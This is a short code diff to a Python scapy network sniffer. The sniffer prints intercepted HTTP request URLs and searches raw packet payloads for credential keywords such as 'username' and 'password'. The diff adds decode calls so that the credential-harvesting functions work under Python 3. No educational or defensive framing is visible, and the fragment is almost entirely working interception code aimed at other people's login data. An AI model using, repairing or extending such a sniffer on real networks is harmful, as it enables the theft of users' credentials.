@@ -13,7 +13,7 @@ def get_url(packet):
 
 def get_username_pass(packet):
     if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.Raw):
-        load = packet[scapy.Raw].load
+        load = packet[scapy.Raw].load.decode()
         keywords = ["username", "uname", "login", "password", "pass"]
         for key in keywords:
             if key in load:
@@ -23,7 +23,7 @@ def get_username_pass(packet):
 def packet_function(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("[+] HTTP Request-> " + url)
+        print("[+] HTTP Request-> " + url.decode())
 
         login = get_username_pass(packet)
         if login:
